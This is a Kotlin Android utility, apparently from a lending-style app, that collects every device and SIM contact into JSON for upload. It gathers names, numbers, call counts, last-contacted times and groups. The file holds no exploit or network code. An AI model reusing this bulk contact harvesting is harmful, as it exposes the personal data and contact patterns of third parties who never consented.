package com.mari.uang.util.upload

import android.content.Context
import android.net.Uri
import android.os.Build.VERSION
import android.provider.ContactsContract
import android.provider.ContactsContract.CommonDataKinds.Phone
import android.telephony.TelephonyManager
import android.text.TextUtils
import com.alibaba.fastjson.JSONArray
import com.alibaba.fastjson.JSONObject
import com.mari.uang.MyApplication
import java.util.*
import kotlin.collections.ArrayList

/**
 *
 * @ProjectName:    Business
 * @Package:        com.alan.business.util.upload
 * @ClassName:      ContactsUtils
 * @Description:     java类作用描述
 * @Author:         jtao
 * @CreateDate:     2021/4/21 1:17 PM
 * @UpdateUser:     更新者
 * @UpdateDate:     2021/4/21 1:17 PM
 * @UpdateRemark:   更新说明
 * @Version:        1.0
 */
object ContactsUtils {

    private val mContext = MyApplication.baseCox()
    private const val TYPE_DEVIECE = "device"
    private const val TYPE_SIM = "sim"
    private val PHONES_PROJECTION = arrayOf(
        "display_name",
        "data1",
        "times_contacted",
        "last_time_contacted",
        "photo_id",
        "contact_id"
    )
    private const val LIMIT_PARAM_KEY = "limit"


    fun getContactsInfo(): JSONArray? {
        val list: List<ContactInfoBean>? = queryContacts(0, -1)
        val contacts = JSONArray()
        if (list != null && !list.isEmpty()) {
            val var3: Iterator<*> = list.iterator()
            while (var3.hasNext()) {
                val item: ContactInfoBean = var3.next() as ContactInfoBean
                val contact = JSONObject()
                try {

                    contact["name"] = UploadDataUtil.filterOffUtf8Mb4(item.name)
                    contact["mobile"] = UploadDataUtil.filterOffUtf8Mb4(item.mobile)
                    contact["times_contacted"] = item.times_contacted
                    contact["last_time_contacted"] = item.last_time_contacted
                    contact["up_time"] = item.up_time
                    contact["last_time_used"] = item.last_time_used
                    contact["source"] =
                        if (TextUtils.isEmpty(item.source)) "" else item.source
                    contact["group"] = queryGroups(item.id)
                    contacts.add(contact)
                } catch (var7: Exception) {
                }
            }
        }
        return contacts
    }

    private fun queryContacts(id: Int, limit: Int): ArrayList<ContactInfoBean>? {
        val allFriendInfoList = ArrayList<ContactInfoBean>()
        return try {
            allFriendInfoList.addAll(fillDetailInfo(id, limit)!!)
            allFriendInfoList.addAll(getSimContactInfoList()!!)
            allFriendInfoList
        } catch (var8: Exception) {
            var8.printStackTrace()
            allFriendInfoList
        } finally {
        }
    }

    private fun getSimContactInfoList(): ArrayList<ContactInfoBean> {
        val simFriendInfos = ArrayList<ContactInfoBean>()
        val manager =
            mContext!!.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (manager != null && manager.simState != TelephonyManager.SIM_STATE_READY) {
            return simFriendInfos
        } else {
            val resolver = mContext.contentResolver
            val uri = Uri.parse("content://icc/adn")
            val phoneCursor = resolver.query(
                uri,
                PHONES_PROJECTION,
                null as String?,
                null as Array<String?>?,
                null as String?
            )
            while (phoneCursor != null && phoneCursor.moveToNext()) {
                val columnIndex = phoneCursor.getColumnIndex("_id")
                val id = phoneCursor.getLong(columnIndex)
                val phoneNumber = phoneCursor.getString(1)
                if (!TextUtils.isEmpty(phoneNumber)) {
                    val contactName = phoneCursor.getString(0)
                    val contactModel = ContactInfoBean()
                    contactModel.name = (contactName)
                    contactModel.mobile = (phoneNumber)
                    contactModel.source = ("sim")
                    contactModel.id = (id)
                    simFriendInfos.add(contactModel)
                }
            }
            phoneCursor?.close()
            return simFriendInfos
        }
    }

    private fun fillDetailInfo(id: Int, limit: Int): ArrayList<ContactInfoBean> {
        val phoneFriendInfoList = ArrayList<ContactInfoBean>()
        val cr = mContext!!.contentResolver
        val projection =
            arrayOf("_id", "has_phone_number", "display_name")
        var selection = "_id > $id"
        val sort = "_id"
        var queryUri =
            if (limit > 0) ContactsContract.Contacts.CONTENT_URI.buildUpon()
                .appendQueryParameter("limit", limit.toString())
                .build() else ContactsContract.Contacts.CONTENT_URI
        val cursor =
            cr.query(queryUri!!, projection, selection, null as Array<String?>?, sort)
        if (cursor != null && cursor.count > 0) {
            while (true) {
                var hasPhone: Boolean
                var displayName: String?
                var contactModel: ContactInfoBean
                var phoneNumber: String
                while (true) {
                    if (!cursor.moveToNext()) {
                        return phoneFriendInfoList
                    }
                    queryUri = Phone.CONTENT_URI
                    selection = "contact_id = ? "
                    val args = arrayOfNulls<String>(1)
                    val builder = StringBuilder()
                    var columnIndex = cursor.getColumnIndex("_id")
                    val rawId = cursor.getLong(columnIndex)
                    val hasPhoneColumnIndex = cursor.getColumnIndex("has_phone_number")
                    hasPhone = hasPhoneColumnIndex > 0 && cursor.getInt(hasPhoneColumnIndex) > 0
                    val displayNameColumnIndex = cursor.getColumnIndex("display_name")
                    displayName = cursor.getString(displayNameColumnIndex)
                    contactModel = ContactInfoBean()
                    contactModel.id = (rawId)
                    phoneNumber = ""
                    if (!hasPhone) {
                        break
                    }
                    args[0] = rawId.toString()
                    var projectionList: List<*>
                    projectionList = if (VERSION.SDK_INT >= 18) {
                        Arrays.asList(
                            "data1",
                            "last_time_contacted",
                            "last_time_used",
                            "times_used",
                            "times_contacted",
                            "contact_last_updated_timestamp"
                        )
                    } else {
                        Arrays.asList("data1", "times_contacted")
                    }
                    val phoneCur =
                        cr.query(
                            queryUri,
                            projectionList.toTypedArray(),
                            selection,
                            args,
                            null as String?
                        )
                    if (phoneCur != null && phoneCur.count > 0) {
                        builder.delete(0, builder.length)
                        while (phoneCur.moveToNext()) {
                            val timesContactsColumnIndex =
                                phoneCur.getColumnIndex("times_contacted")
                            contactModel.times_contacted = (
                                phoneCur.getString(
                                    timesContactsColumnIndex
                                )
                            )
                            if (VERSION.SDK_INT >= 18) {
                                val lastTimeUsedColumnIndex =
                                    phoneCur.getColumnIndex("last_time_used")
                                contactModel.last_time_used = (
                                    phoneCur.getLong(
                                        lastTimeUsedColumnIndex
                                    ).toString()
                                )
                                val lastTimeContactedColumnIndex =
                                    phoneCur.getColumnIndex("last_time_contacted")
                                contactModel.last_time_contacted = (
                                    phoneCur.getLong(
                                        lastTimeContactedColumnIndex
                                    ).toString()
                                )
                                val lastUpdateTimeUsedColumnIndex =
                                    phoneCur.getColumnIndex("contact_last_updated_timestamp")
                                contactModel.up_time = (
                                    phoneCur.getLong(
                                        lastUpdateTimeUsedColumnIndex
                                    ).toString()
                                )
                            }
                            columnIndex = phoneCur.getColumnIndex("data1")
                            if (columnIndex >= 0) {
                                val phone = phoneCur.getString(columnIndex)
                                if (!UploadDataUtil.isValidChinaChar(phone)) {
                                    builder.append(phone)
                                    if (!phoneCur.isLast) {
                                        builder.append(",")
                                    }
                                }
                            }
                        }
                        phoneCur.close()
                        phoneNumber = builder.toString()
                        break
                    }
                }
                contactModel.name = (displayName)
                contactModel.source = ("device")
                if (hasPhone) {
                    contactModel.mobile = (phoneNumber)
                } else {
                    contactModel.mobile = (displayName)
                }
                phoneFriendInfoList.add(contactModel)
            }
        } else {
            return phoneFriendInfoList
        }
    }

    private fun queryGroups(rawId: Long): ArrayList<String> {
        val groupNameArray = ArrayList<String>()
        val cr = mContext!!.contentResolver
        val projection = arrayOf("data1")
        val groupCursor = cr.query(
            ContactsContract.Data.CONTENT_URI,
            projection,
            "mimetype='vnd.android.cursor.item/group_membership' AND raw_contact_id = $rawId",
            null as Array<String?>?,
            null as String?
        )
        while (groupCursor != null && groupCursor.moveToNext()) {
            val groupNameCursor = cr.query(
                ContactsContract.Groups.CONTENT_URI,
                Arrays.asList("title")
                    .toTypedArray() as Array<String>,
                "_id=" + groupCursor.getInt(0),
                null as Array<String?>?,
                null as String?
            )
            if (groupNameCursor != null) {
                groupNameCursor.moveToNext()
                groupNameArray.add(groupNameCursor.getString(0))
                groupNameCursor.close()
            }
        }
        groupCursor?.close()
        return groupNameArray
    }
    
}